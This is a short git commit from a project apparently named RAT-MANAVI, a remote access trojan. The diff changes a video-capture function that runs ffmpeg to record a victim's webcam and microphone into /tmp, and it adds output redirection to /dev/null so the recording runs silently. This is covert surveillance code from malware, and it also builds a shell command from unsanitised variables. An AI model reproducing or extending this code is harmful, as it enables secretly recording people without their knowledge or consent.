117f5896d91548a40636b35488ee502e29afdc5c
mvasquezbec <mavmfi@hotmail.com>
2015-07-24 22:18:51 -0500

    Salida a null

--- RAT-MANAVI/capvideo.py
+++ RAT-MANAVI/capvideo.py
@@ -21,4 +21,4 @@ def video(arg1):
 #       comando = "streamer -t 0:0:"+ y + " -c /dev/video0 -f rgb24 -F mono16 -r 3 -o " + x + ".avi"
 #debian 6
         comando = "ffmpeg -f video4linux2 -s 640x480 -r ntsc -i /dev/video0 -f oss -i /dev/dsp -t 00:00:" + y + " -qscale 3 /tmp/" + x + ".mpeg"
-        os.system(comando)
+        os.system(comando + "> /dev/null 2>&1")
